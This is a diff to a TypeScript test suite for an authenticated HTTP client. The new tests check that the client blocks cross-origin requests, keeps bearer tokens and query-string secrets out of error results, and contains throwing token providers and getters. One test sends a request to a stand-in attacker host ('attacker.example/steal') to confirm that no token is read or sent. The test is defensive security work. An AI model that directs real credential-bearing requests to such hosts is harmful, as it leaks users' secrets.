@@ -7,8 +7,8 @@
  * header composition (Authorization Bearer + defaultHeaders + per-call); body
  * JSON-stringification + Zod validation of the response; the `401` →
  * invalidate + re-mint + single retry path; error classification (transient
- * 5xx/network vs non-retriable parse/4xx); and that no exception escapes any
- * method.
+ * network/408/429/5xx vs non-retriable parse/other 4xx); and that no exception
+ * escapes any method.
  */
 
 import { describe, it, expect } from "bun:test";
@@ -18,6 +18,8 @@ import {
   createAuthedHttpClient,
   buildUrl,
   type AuthedHttpCapability,
+  type AuthedRequestOpts,
+  type AuthedBodyRequestOpts,
 } from "../client.js";
 import { createFakeAuthedHttpCapability, shapedRoute } from "../index.js";
 import type { FetchLike, FetchResponseLike, TokenProvider, BearerToken } from "../auth.js";
@@ -63,6 +65,7 @@ const fakeTokens = (tokens: string[]): TokenProvider & { invalidations: number }
       const t = tokens[Math.min(i, tokens.length - 1)];
       return ok(t as BearerToken);
     },
+    probe: async () => ok(undefined),
     invalidate: (): void => {
       state.invalidations += 1;
       i += 1;
@@ -103,6 +106,41 @@ describe("buildUrl", () => {
 // ---------------------------------------------------------------------------
 
 describe("createAuthedHttpClient — request construction", () => {
+  it("rejects a cross-origin absolute URL before reading a token or calling fetch", async () => {
+    let tokenReads = 0;
+    let fetchCalls = 0;
+    const tokens: TokenProvider = {
+      get: async () => {
+        tokenReads += 1;
+        return ok("managed-secret" as BearerToken);
+      },
+      probe: async () => ok(undefined),
+      invalidate: () => {},
+    };
+    const fetch: FetchLike = async () => {
+      fetchCalls += 1;
+      return jsonResponse(200, { id: "1", name: "leaked" });
+    };
+
+    const result = await makeClient(fetch, tokens).get("https://attacker.example/steal", { schema: PayloadSchema });
+
+    expect(isErr(result)).toBe(true);
+    if (!result.ok) expect(result.error.kind).toBe("node-crash");
+    expect(tokenReads).toBe(0);
+    expect(fetchCalls).toBe(0);
+  });
+
+  it("accepts a same-origin absolute URL", async () => {
+    const { fetch, calls } = recordingFetch(() => jsonResponse(200, { id: "1", name: "Alice" }));
+    const result = await makeClient(fetch, fakeTokens(["tok-1"])).get(
+      "https://api.example.com/customers/1",
+      { schema: PayloadSchema },
+    );
+
+    expect(isOk(result)).toBe(true);
+    expect(calls[0]?.url).toBe("https://api.example.com/customers/1");
+  });
+
   it("GET builds baseUrl+path and injects the bearer token + default headers", async () => {
     const { fetch, calls } = recordingFetch(() => jsonResponse(200, { id: "1", name: "Alice" }));
     const client = makeClient(fetch, fakeTokens(["tok-1"]));
@@ -169,6 +207,26 @@ describe("createAuthedHttpClient — request construction", () => {
     expect(isErr(result)).toBe(true);
     if (!result.ok) expect(result.error.kind).toBe("node-crash");
   });
+
+  it("rejects cyclic and BigInt request bodies as non-retriable payload errors without fetching", async () => {
+    const { fetch, calls } = recordingFetch(() => jsonResponse(200, { id: "1", name: "unused" }));
+    const client = makeClient(fetch, fakeTokens(["tok-1"]));
+    const cyclic: Record<string, unknown> = {};
+    cyclic.self = cyclic;
+
+    for (const body of [cyclic, { amount: 1n }]) {
+      const result = await client.post("/customers", { schema: PayloadSchema, body });
+      expect(isErr(result)).toBe(true);
+      if (!result.ok) {
+        expect(result.error.kind).toBe("node-crash");
+        if (result.error.kind === "node-crash") {
+          expect(result.error.message).toContain("not JSON-serializable");
+          expect(result.error.retriability).toBe("non-retriable");
+        }
+      }
+    }
+    expect(calls).toHaveLength(0);
+  });
 });
 
 // ---------------------------------------------------------------------------
@@ -198,9 +256,13 @@ describe("createAuthedHttpClient — 401 retry", () => {
     const tokens = fakeTokens(["t1", "t2"]);
     const client = makeClient(fetch, tokens);
 
-    const result = await client.get("/customers/1", { schema: PayloadSchema });
+    const result = await client.get("/customers/1?api_key=query-secret", { schema: PayloadSchema });
     expect(isErr(result)).toBe(true);
-    if (!result.ok) expect(result.error.kind).toBe("node-crash");
+    if (!result.ok) {
+      expect(result.error.kind).toBe("node-crash");
+      expect(JSON.stringify(result.error)).not.toContain("query-secret");
+      expect(JSON.stringify(result.error)).toContain("https://api.example.com/customers/1");
+    }
 
     expect(tokens.invalidations).toBe(1); // invalidated once, retried once, then gave up
     expect(calls).toHaveLength(2);
@@ -222,6 +284,7 @@ describe("createAuthedHttpClient — 401 retry", () => {
     const { fetch, calls } = recordingFetch(() => jsonResponse(200, { id: "1", name: "Alice" }));
     const failingTokens: TokenProvider = {
       get: async () => err({ kind: "transient", nodeId: nodeId("test"), message: "auth down" }),
+      probe: async () => ok(undefined),
       invalidate: () => {},
     };
     const client = makeClient(fetch, failingTokens);
@@ -237,14 +300,15 @@ describe("createAuthedHttpClient — 401 retry", () => {
 // ---------------------------------------------------------------------------
 
 describe("createAuthedHttpClient — error mapping", () => {
-  it("5xx → transient (retriable) with httpStatus", async () => {
-    const { fetch } = recordingFetch(() => jsonResponse(503, "unavailable"));
-    const client = makeClient(fetch, fakeTokens(["t1"]));
+  it("5xx → transient without reflecting an echoed bearer token", async () => {
+    const { fetch } = recordingFetch(() => jsonResponse(503, "server echoed managed-secret"));
+    const client = makeClient(fetch, fakeTokens(["managed-secret"]));
     const result = await client.get("/x", { schema: PayloadSchema });
     expect(isErr(result)).toBe(true);
     if (!result.ok) {
       expect(result.error.kind).toBe("transient");
       if (result.error.kind === "transient") expect(result.error.httpStatus).toBe(503);
+      expect(JSON.stringify(result.error)).not.toContain("managed-secret");
     }
   });
 
@@ -259,12 +323,17 @@ describe("createAuthedHttpClient — error mapping", () => {
     }
   });
 
-  it("a network throw → transient (no exception escapes)", async () => {
-    const fetch: FetchLike = async () => { throw new Error("ECONNRESET"); };
-    const client = makeClient(fetch, fakeTokens(["t1"]));
+  it("a network throw → secret-free transient (no exception escapes)", async () => {
+    const fetch: FetchLike = async (_url, init) => {
+      throw new Error(`transport reflected ${init.headers.Authorization}`);
+    };
+    const client = makeClient(fetch, fakeTokens(["managed-secret"]));
     const result = await client.get("/x", { schema: PayloadSchema });
     expect(isErr(result)).toBe(true);
-    if (!result.ok) expect(result.error.kind).toBe("transient");
+    if (!result.ok) {
+      expect(result.error.kind).toBe("transient");
+      expect(JSON.stringify(result.error)).not.toContain("managed-secret");
+    }
   });
 
   it("invalid JSON body → non-retriable node-crash", async () => {
@@ -294,6 +363,81 @@ describe("createAuthedHttpClient — error mapping", () => {
       const result = await op();
       expect(isErr(result)).toBe(true);
     }
+  });
+
+  it("contains hostile request-option accessors in a secret-free Result", async () => {
+    const { fetch, calls } = recordingFetch(() => jsonResponse(200, { id: "1", name: "unused" }));
+    const client = makeClient(fetch, fakeTokens(["managed-secret"]));
+
+    const common = Object.defineProperty(
+      { schema: PayloadSchema },
+      "headers",
+      { get: () => { throw new Error("header getter leaked managed-secret"); } },
+    ) as AuthedRequestOpts<z.output<typeof PayloadSchema>>;
+    const commonResult = await client.get("/x", common);
+
+    const body = Object.defineProperty(
+      { schema: PayloadSchema },
+      "body",
+      { get: () => { throw new Error("body getter leaked managed-secret"); } },
+    ) as AuthedBodyRequestOpts<z.output<typeof PayloadSchema>>;
+    const bodyResult = await client.post("/x", body);
+
+    for (const result of [commonResult, bodyResult]) {
+      expect(result.ok).toBe(false);
+      if (!result.ok) {
+        expect(result.error.kind).toBe("node-crash");
+        expect(JSON.stringify(result.error)).not.toContain("managed-secret");
+      }
+    }
+    expect(calls).toHaveLength(0);
+  });
+
+  it("normalizes a rejecting initial token lookup into a secret-free Result", async () => {
+    const { fetch, calls } = recordingFetch(() => jsonResponse(200, { id: "1", name: "unused" }));
+    const tokens: TokenProvider = {
+      get: async () => { throw new Error("provider leaked s3cret"); },
+      probe: async () => ok(undefined),
+      invalidate: () => {},
+    };
+    const result = await makeClient(fetch, tokens).get("/x", { schema: PayloadSchema });
+
+    expect(isErr(result)).toBe(true);
+    if (!result.ok) {
+      expect(result.error.kind).toBe("node-crash");
+      if (result.error.kind === "node-crash") {
+        expect(result.error.message).not.toContain("s3cret");
+      }
+    }
+    expect(calls).toHaveLength(0);
+  });
+
+  it("normalizes rejecting refresh lookup and throwing invalidation into Results", async () => {
+    const { fetch, calls } = recordingFetch(() => jsonResponse(401, "expired"));
+    let gets = 0;
+    const rejectingRefresh: TokenProvider = {
+      get: async () => {
+        gets += 1;
+        if (gets === 1) return ok("stale" as BearerToken);
+        throw new Error("refresh rejected");
+      },
+      probe: async () => ok(undefined),
+      invalidate: () => {},
+    };
+    const refreshResult = await makeClient(fetch, rejectingRefresh).get("/x", { schema: PayloadSchema });
+    expect(isErr(refreshResult)).toBe(true);
+    if (!refreshResult.ok) expect(refreshResult.error.kind).toBe("node-crash");
+    expect(calls).toHaveLength(1);
+
+    const throwingInvalidate: TokenProvider = {
+      get: async () => ok("stale" as BearerToken),
+      probe: async () => ok(undefined),
+      invalidate: () => { throw new Error("invalidate rejected"); },
+    };
+    const invalidationResult = await makeClient(fetch, throwingInvalidate).get("/x", { schema: PayloadSchema });
+    expect(isErr(invalidationResult)).toBe(true);
+    if (!invalidationResult.ok) expect(invalidationResult.error.kind).toBe("node-crash");
+    expect(calls).toHaveLength(2);
   });
 });
 
@@ -338,9 +482,13 @@ describe("createAuthedHttpClient — retriability classification", () => {
       tokens: fakeTokens(["t1"]),
       fetch,
     });
-    const result = await client.get("/slow", { schema: PayloadSchema });
+    const result = await client.get("/slow?api_key=query-secret", { schema: PayloadSchema });
     expect(isErr(result)).toBe(true);
-    if (!result.ok) expect(result.error.kind).toBe("transient");
+    if (!result.ok) {
+      expect(result.error.kind).toBe("transient");
+      expect(JSON.stringify(result.error)).not.toContain("query-secret");
+      expect(JSON.stringify(result.error)).toContain("https://api.example.com/slow");
+    }
   });
 
   it("a non-timeout AbortError (cancellation) → non-retriable node-crash", async () => {
@@ -355,11 +503,13 @@ describe("createAuthedHttpClient — retriability classification", () => {
       tokens: fakeTokens(["t1"]),
       fetch,
     });
-    const result = await client.get("/x", { schema: PayloadSchema });
+    const result = await client.get("/x?api_key=query-secret", { schema: PayloadSchema });
     expect(isErr(result)).toBe(true);
     if (!result.ok) {
       expect(result.error.kind).toBe("node-crash");
       if (result.error.kind === "node-crash") expect(result.error.retriability).toBe("non-retriable");
+      expect(JSON.stringify(result.error)).not.toContain("query-secret");
+      expect(JSON.stringify(result.error)).toContain("https://api.example.com/x");
     }
   });
 });
@@ -459,6 +609,8 @@ describe("createFakeAuthedHttpCapability", () => {
     "POST /orders": shapedRoute({ body: { id: "ord-1", name: "Order" } }),
     "GET /customers/999": shapedRoute({ status: 404, body: "Not Found" }),
     "GET /flaky": shapedRoute({ status: 503, body: "down" }),
+    "GET /rate-limited": shapedRoute({ status: 429, body: "slow down" }),
+    "GET /timed-out": shapedRoute({ status: 408, body: "too slow" }),
   });
   const client = fake.client;
 
@@ -493,11 +645,14 @@ describe("createFakeAuthedHttpCapability", () => {
     }
   });
 
-  it("a 5xx status route → transient", async () => {
-    const result = await client.get("/flaky", { schema: PayloadSchema });
-    expect(isErr(result)).toBe(true);
-    if (!result.ok) expect(result.error.kind).toBe("transient");
-  });
+  it.each(["/flaky", "/rate-limited", "/timed-out"])(
+    "a retriable production status route (%s) → transient",
+    async (path) => {
+      const result = await client.get(path, { schema: PayloadSchema });
+      expect(isErr(result)).toBe(true);
+      if (!result.ok) expect(result.error.kind).toBe("transient");
+    },
+  );
 
   it("matchBody mismatch fails the route so a wrong payload surfaces", async () => {
     const fakeWithAssertion = createFakeAuthedHttpCapability({
